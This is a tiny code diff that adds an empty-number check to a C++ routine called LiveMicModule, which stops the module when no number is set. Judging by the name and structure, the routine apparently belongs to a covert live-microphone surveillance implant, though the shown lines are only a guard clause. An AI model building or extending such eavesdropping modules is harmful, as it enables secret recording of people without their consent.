@@ -16,6 +16,11 @@ DWORD WINAPI LiveMicModule(LPVOID lpParam) {
 		return 0;
 	}
 
+	if (number.empty()) {
+		me->setStatus(MODULE_STOPPED);
+		return 0;
+	}
+
 	me->setStatus(MODULE_RUNNING);
 	eventHandle = me->getEvent();
 
